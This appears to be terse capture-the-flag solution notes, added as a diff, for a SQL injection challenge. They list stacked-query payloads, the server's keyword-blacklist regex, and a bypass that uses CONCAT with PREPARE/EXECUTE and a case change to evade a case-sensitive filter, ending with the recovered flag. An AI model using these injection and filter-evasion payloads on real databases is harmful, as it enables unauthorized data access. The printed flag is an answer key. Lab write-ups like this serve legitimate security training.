@@ -1,0 +1,38 @@
+input '; show tables#     show
+
+array(1) {
+  [0]=>
+  string(16) "1919810931114514"
+}
+
+array(1) {
+  [0]=>
+  string(5) "words"
+}
+
+input   '; select * from 1919810931114514##   show
+return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);
+
+bypass select
+
+input:
+-1';
+set @sql=CONCAT('se','lect * from `1919810931114514`;');
+prepare sqlsql from @sql;
+execute sqlsql;
+
+show:
+strstr($inject, "set") && strstr($inject, "prepare")
+
+
+input:
+-1';
+SET @sql=CONCAT('se','lect * from `1919810931114514`;');
+PREPARE sqlsql from @sql;
+execute sqlsql;
+
+show:
+array(1) {
+  [0]=>
+  string(42) "flag{b282bc3b-cc51-4fd6-83c3-59685c73634a}"
+}
